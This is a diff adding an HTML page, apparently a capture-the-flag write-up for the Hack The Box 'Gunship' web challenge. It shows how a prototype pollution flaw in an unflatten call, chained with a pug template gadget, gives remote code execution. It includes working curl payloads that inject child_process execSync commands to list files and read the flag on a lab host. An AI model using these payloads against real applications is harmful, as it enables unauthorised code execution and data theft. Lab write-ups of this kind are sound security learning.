@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2025-05-05 Mon 21:34 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Gunship</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">Gunship</h1>
+<p>
+Once again, a challenge where the website accepts user input. You have to
+introduce your favorite artist's name. Right at the start, it's possible to see
+that you just can't introduce <b>any</b> name:
+</p>
+
+
+
+<div id="orgbe8b11e" class="figure">
+<p><img src="writeup-img/2025-01-05_10-44-28_screenshot.png" alt="2025-01-05_10-44-28_screenshot.png" />
+</p>
+</div>
+
+<p>
+Unless you introduce the name of one of the two artists that are part of the
+aforementioned band called <code>Gunship</code>:
+</p>
+
+
+
+<div id="org52ea041" class="figure">
+<p><img src="writeup-img/2025-01-05_10-45-58_screenshot.png" alt="2025-01-05_10-45-58_screenshot.png" />
+</p>
+</div>
+
+<p>
+If you download the files, you can see the logic related to this in
+<code>routes/index.js</code>, where there are three valid names: <code>Haigh</code>, <code>Westaway</code> and <code>Gingell</code>.
+I don't even know where <code>Gingell</code> comes from:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-js">router.post(<span class="org-string">'/api/submit'</span>, (req, res) =&gt; {
+    <span class="org-keyword">const</span> { artist } = unflatten(req.body);
+
+    <span class="org-keyword">if</span> (artist.name.includes(<span class="org-string">'Haigh'</span>) || artist.name.includes(<span class="org-string">'Westaway'</span>) || artist.name.includes(<span class="org-string">'Gingell'</span>)) {
+        <span class="org-keyword">return</span> res.json({
+            <span class="org-string">'response'</span>: pug.compile(<span class="org-string">'span Hello #{user}, thank you for letting us know!'</span>)({ user: <span class="org-string">'guest'</span> })
+        });
+    } <span class="org-keyword">else</span> {
+        <span class="org-keyword">return</span> res.json({
+            <span class="org-string">'response'</span>: <span class="org-string">'Please provide us with the full name of an existing member.'</span>
+        });
+    }
+});
+</pre>
+</div>
+
+<p>
+Right from the get go, this web app uses a template engine called <code>pugjs</code>, but
+doesn't seem really that exploitable, since it's just HTML. What's interesting
+here is <code>unflatten</code>, which can be exploited because of <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Prototype%20Pollution/">Prototype Pollution</a>. That
+means I can just manipulate the <code>json</code> data sent in the <code>POST</code> request and get
+results. Here is an example of a simple request when submitting the name:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl <span class="org-string">'http://94.237.50.242:46641/api/submit'</span><span class="org-sh-escaped-newline">\</span>
+     -X POST <span class="org-sh-escaped-newline">\</span>
+     -H <span class="org-string">'Content-Type: application/json'</span> <span class="org-sh-escaped-newline">\</span>
+     --data-raw <span class="org-string">'{"artist.name":"Gingell"}'</span>
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-js">{<span class="org-string">"response"</span>:<span class="org-string">"&lt;span&gt;Hello guest, thank you for letting us know!&lt;/span&gt;"</span>}
+</pre>
+</div>
+
+<p>
+If I add <code>"___proto___.json spaces": " "</code> to the <code>json</code> data that is sent, we can see
+that the setting was applied, by looking at the spaces that were added to the
+<code>json</code> result:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl <span class="org-string">'http://94.237.50.242:46641/api/submit'</span><span class="org-sh-escaped-newline">\</span>
+     -X POST <span class="org-sh-escaped-newline">\</span>
+     -H <span class="org-string">'Content-Type: application/json'</span> <span class="org-sh-escaped-newline">\</span>
+     --data-raw <span class="org-string">'{"artist.name":"Gingell", "__proto__.json spaces": " "}'</span>
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-js">{
+    <span class="org-string">"response"</span>: <span class="org-string">"&lt;span&gt;Hello guest, thank you for letting us know!&lt;/span&gt;"</span>
+}
+</pre>
+</div>
+
+<p>
+The <code>pugjs</code> GitHub repository has an interesting <a href="https://github.com/pugjs/pug/issues/3414">issue</a> with some useful gadgets
+for <code>Remote Code Execution</code>! Since they are all being done on
+<code>Object.prototype.xxx</code>, that means we can manipulate the <code>json</code> that is being sent
+to do the same. Let's start with executing a <code>ls -la</code> command to show the contents
+of the directory and, since we know the output won't be in the request result,
+let's just redirect it to the <code>css</code> file of the web application:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl <span class="org-string">'http://94.237.50.242:46641/api/submit'</span><span class="org-sh-escaped-newline">\</span>
+     -X POST <span class="org-sh-escaped-newline">\</span>
+     -H <span class="org-string">'Content-Type: application/json'</span> <span class="org-sh-escaped-newline">\</span>
+     --data-raw <span class="org-string">'{"artist.name":"Gingell", "__proto__.block.type": "Text", "__proto__.block.line": "process.mainModule.require(\"child_process\").execSync(\"ls -la &gt;&gt; static/css/main.css\")" }'</span>
+</pre>
+</div>
+
+<p>
+And the results are in:
+</p>
+
+
+
+<div id="orgc260006" class="figure">
+<p><img src="writeup-img/2025-01-05_11-05-24_screenshot.png" alt="2025-01-05_11-05-24_screenshot.png" />
+</p>
+</div>
+
+<p>
+Since we appended to the <code>css</code> file, it goes to the end of it. As the image shows,
+we got the result of the <code>ls -la</code> command and we can see the flag is in the same
+directory. Therefore to get the flag, we just execute <code>cat flag</code> and redirect it
+to the same file!
+</p>
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">05-01-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+</div>
+</body>
+</html>
